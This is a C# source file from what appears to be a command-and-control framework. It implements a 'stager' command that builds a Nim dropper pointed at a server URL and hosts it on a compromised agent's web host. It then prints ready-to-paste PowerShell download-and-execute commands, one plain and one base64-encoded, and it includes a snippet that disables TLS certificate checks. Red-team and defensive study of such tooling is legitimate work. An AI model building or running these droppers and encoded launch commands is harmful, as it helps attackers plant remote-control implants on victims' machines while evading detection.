using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Internal;
using System.IO;
using System.Text.RegularExpressions;
using Commander.Commands.Agent;

namespace Commander.Commands.Laucher
{
    public class BuildStagerFromAgentCommandOptions
    {

        public string endpoint { get; set; }
        public string url { get; set; }

        public string fileName { get; set; }
        public string save { get; set; }

        public bool debug { get; set; }

        public bool webhost { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }
    }
    public class BuildStagerFromAgentCommand : EnhancedCommand<BuildStagerFromAgentCommandOptions>
    {
        public static string PowershellSSlScript  = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";

        public override string Category => CommandCategory.Core;
        public override string Description => "Create a stager file";
        public override string Name => "stager";

        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("endpoint", "endpoint to connect to"),
            new Option<string>(new[] { "--url", "-u" }, () => null, "url to download stage from"),
            new Option<string>(new[] { "--fileName", "-f" }, () => null ,"Nome of the file to be crafted"),
            new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
            new Option<string>(new[] { "--save", "-s" }, () => null, "Folder to save the generated file"),
            new Option(new[] { "--webhost", "-wh" }, "Host the payload on the agent Web Host"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildStagerFromAgentCommandOptions> context)
        {

            var agent = context.Executor.CurrentAgent;
            var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
            if(!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            var url = context.Options.url;
            int urlPort = 80;
            if (string.IsNullOrEmpty(url))
            {
                if (endpoint.Protocol == ConnexionType.Http)
                {
                    url = endpoint.ToString();
                }
                else
                {   //it's a pivot webhost should be running on it
                    url = "http://" + endpoint.Address + $":{urlPort}/wh/";
                }

                context.Terminal.WriteLine($"[X] Url was not specified, using {url} !");
            }

            try
            {
                Uri uri = new Uri(url);
                urlPort = uri.Port;
            }
            catch (Exception ex)
            {
                //context.Terminal.WriteLine(ex.ToString());
            }

            url += "/wh/";



            var outFile = context.Options.fileName;
            if(string.IsNullOrEmpty(outFile))
            {
                outFile = "stager_" + endpoint.ProtocolString + "_" + Regex.Replace(endpoint.Address, @"[^\w\s]", "_");
            }

            if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                outFile += ".exe";

            string outPath = Path.Combine("/tmp", outFile);
            if (!string.IsNullOrEmpty(context.Options.save))
            {
                outPath = Path.Combine(context.Options.save, outFile);
            }

            
            var parms = BuildHelper.ComputeNimBuildParameters("dropper", outPath, context.Options.debug, false);

            if (context.Options.x86)
                parms.Insert(3, $"--cpu:i386");
            else
                parms.Insert(3, $"--cpu:amd64");

            //using puppy library prevent the need of ssl
            //if (listener.Secured)
            //{
            //    parms.Insert(3, $"-d:ssl");
            //}
            var fileName = "Agent";
            if (context.Options.x86)
                fileName += "-x86";
            fileName += ".b64";

            
            parms.Insert(4, $"-d:ServerUrl={url}");
            parms.Insert(5, $"-d:DotNetParams={endpoint}");
            parms.Insert(6, $"-d:FileName={fileName}");
            
            context.Terminal.WriteLine($"[>] Generating dropper...");

            if (context.Options.verbose)
                context.Terminal.WriteLine($"[>] Executing: nim {string.Join(" ", parms)}");
            var executionResult = BuildHelper.NimBuild(parms);

            if (context.Options.verbose)
                context.Terminal.WriteLine(executionResult.Out);
            if (executionResult.Result != 0)
            {
                context.Terminal.WriteError($"[X] Build Failed!");
                return false;
            }

            context.Terminal.WriteSuccess($"[*] Build succeed.");
            context.Terminal.WriteInfo($"Dropper can be found at {outPath}");

            
            if (context.Options.webhost)
            {

                byte[] fileContent = File.ReadAllBytes(outPath);
                await WebHostCommand.PushFile(context, outFile, fileContent);
 
                string urlwh = $"{url}{outFile}";
                context.Terminal.WriteLine($"[*] dropper hosted on : {urlwh}");

                string script = $"iwr -Uri '{urlwh}' -OutFile '{outFile}'; .\\{outFile}";

                string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

                //string encoded = Encoding.UTF8.GetString(utf8String)
                context.Terminal.WriteLine($"[>] Command : powershell -c \"{script}\"");
                context.Terminal.WriteLine($"[>] Command : powershell -enc {enc64}");
            }

            return true;
        }
    }

}
